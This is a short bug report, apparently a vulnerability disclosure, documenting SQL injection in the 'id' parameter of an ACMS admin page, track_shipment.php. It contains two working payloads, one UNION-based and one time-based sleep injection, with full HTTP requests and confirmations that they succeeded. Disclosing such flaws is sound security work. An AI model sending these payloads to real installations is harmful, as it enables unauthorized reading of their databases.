BUG_Author: XiaoJieSec

Vulnerability File: /acms/admin/transactions/track_shipment.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1' union all select null,null,null,CONCAT(0x23242526,0x73747576),null-- -

```
GET /acms/admin/transactions/track_shipment.php?id=-1%27%20union%20all%20select%20null,null,null,CONCAT(0x23242526,0x73747576),null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php
Connection: close
```

union query success

![image](https://github.com/Hackergrave/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 1 from (select(sleep(10)))a) and 'd'='d

```
GET /acms/admin/transactions/track_shipment.php?id=1%27%20and%20(select%201%20from%20(select(sleep(10)))a)%20and%20%27d%27=%27d HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=ajjmkcq73hjl8r1bb7b4smsaob
Connection: close
```

The response time of the server is greater than 10 seconds

![image](https://github.com/Hackergrave/bug_report/blob/main/sql2.png)
